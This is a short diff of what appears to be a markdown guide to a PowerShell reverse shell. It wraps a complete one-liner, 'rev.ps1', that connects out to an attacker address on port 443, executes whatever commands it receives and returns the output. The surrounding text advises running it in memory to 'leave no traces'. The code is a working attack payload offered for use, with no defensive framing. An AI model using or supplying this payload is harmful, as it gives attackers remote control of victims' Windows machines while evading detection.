@@ -65,9 +65,11 @@ This script is tested on most windows machines and should work fine.
 ```
 #replace <IP_ATTACKER> with target ip, so it is going to look something like this: TCPClient('10.231.12.44',443)
 
+```powershell
+
+# rev.ps1
 $client = New-Object System.Net.Sockets.TCPClient('<IP_ATTACKER>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
 
-launch on target
 ```
 
 Launch the above script directly or save on local attacking maching and call it from powershell like that to execute in memory and leave no traces
